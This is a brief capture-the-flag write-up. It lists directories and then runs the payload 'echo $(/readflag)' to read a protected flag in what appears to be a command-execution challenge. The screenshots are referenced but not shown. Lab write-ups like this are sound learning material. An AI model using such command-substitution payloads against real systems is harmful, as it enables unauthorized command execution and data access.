first of all we try to list the directories by doing 
```
ls
```

![alt text](images/image1.png)

now lets try to view the / directory
```
ls /
```

![alt text](images/image2.png)

we can't read the flag.txt so lets try to execute the readflag using the following payload

```
echo $(/readflag)
```

![alt text](images/image3.png)